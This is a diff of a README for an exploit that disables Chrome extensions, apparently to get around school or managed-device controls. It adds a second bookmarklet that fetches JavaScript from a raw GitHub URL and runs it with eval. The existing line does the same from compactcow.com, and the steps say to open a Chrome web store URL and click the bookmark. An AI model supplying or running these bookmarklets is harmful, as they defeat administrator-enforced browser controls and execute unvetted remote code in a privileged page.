@@ -100,6 +100,10 @@ There are several vesions of this exploit you can use, here are the 2 most commo
     ```js
     javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
     ```  
+    -Compact Cow's UI (Dark)
+    ```js
+    javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
+    ```
 
     Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. Flip the switches on the extentions you want to disable. Simple!  
 
